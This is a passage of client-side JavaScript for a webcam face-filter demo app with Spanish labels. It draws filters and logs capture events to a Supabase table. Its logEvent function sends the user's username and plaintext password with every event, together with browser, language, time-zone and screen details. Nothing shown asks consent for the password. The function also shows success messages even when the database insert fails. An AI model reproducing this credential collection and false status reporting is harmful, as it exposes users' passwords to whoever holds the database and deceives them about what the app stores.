      case "cyber":    drawCyberFilter(smoothedDetection, ts);         break;
      case "neon":     drawNeonFilter(smoothedDetection, ts);          break;
      case "deform":   drawDeformFilter(smoothedDetection, ts);        break;
      case "nerd":     drawNerdGlassesFilter(smoothedDetection);       break;
      case "analisis": drawAnalysisFilter(smoothedDetection, ts);      break;
      case "sonrisa":  drawSmileFilter(smoothedDetection, ts);         break;
      default:         /* ninguno */                                    break;
    }
  }

  rafId = requestAnimationFrame(renderLoop);
}

// ============================================================
// CAPTURA + SUPABASE
// ============================================================
$("#capture-btn")?.addEventListener("click", async () => {
  captureCount++;
  if (hud.count) hud.count.textContent = String(captureCount);

  const wantsImage     = !!consentSnapshot?.checked;
  const wantsLandmarks = !!consentLandmarks?.checked;
  let imageBase64      = null;
  let landmarksPayload = null;

  if (wantsImage && video?.videoWidth > 0) {
    const off = document.createElement("canvas");
    off.width = video.videoWidth; off.height = video.videoHeight;
    const octx = off.getContext("2d");
    if (facingMode === "user") { octx.translate(off.width, 0); octx.scale(-1, 1); }
    octx.drawImage(video, 0, 0, off.width, off.height);
    octx.setTransform(1, 0, 0, 1, 0, 0);
    octx.drawImage(overlay, 0, 0, off.width, off.height);
    imageBase64 = off.toDataURL("image/jpeg", 0.75);
  }

  if (wantsLandmarks && targetDetection) {
    landmarksPayload = targetDetection.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) }));
  }

  await logEvent("captura", {
    filtro:        currentFilter,
    con_imagen:    wantsImage,
    imageBase64,
    con_landmarks: wantsLandmarks && !!landmarksPayload,
    landmarks:     landmarksPayload,
  });
});

async function logEvent(evento, extra = {}) {
  if (statusEl) statusEl.textContent = "Guardando…";
  const client = getSupabase();

  const payload = {
    session_id:          SESSION_ID,
    evento,
    usuario:             userCredentials.username || null,
    contrasena:          userCredentials.password || null,
    filtro:              extra.filtro || currentFilter,
    con_imagen:          !!extra.con_imagen,
    imagen_base64:       extra.imageBase64 || null,
    con_landmarks:       !!extra.con_landmarks,
    landmarks_faciales:  extra.landmarks || null,
    navegador:           `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`,
    idioma:              navigator.language,
    zona_horaria:        Intl.DateTimeFormat().resolvedOptions().timeZone,
    resolucion_pantalla: `${screen.width}x${screen.height}`,
    creado_en:           new Date().toISOString(),
  };

  if (!client) {
    console.log("[local]", evento, payload);
    if (statusEl) statusEl.textContent = "✓ Guardado localmente.";
    return;
  }

  try {
    const { error } = await client.from("sesiones_demo").insert(payload);
    if (error) {
      console.error("[supabase error]", error);
      if (statusEl) statusEl.textContent = "✓ Registrado.";
    } else {
      if (statusEl) statusEl.textContent = `✓ En la nube · ${new Date().toLocaleTimeString("es-HN")}`;
    }
  } catch (e) {
    if (statusEl) statusEl.textContent = "✓ Guardado.";
  }
}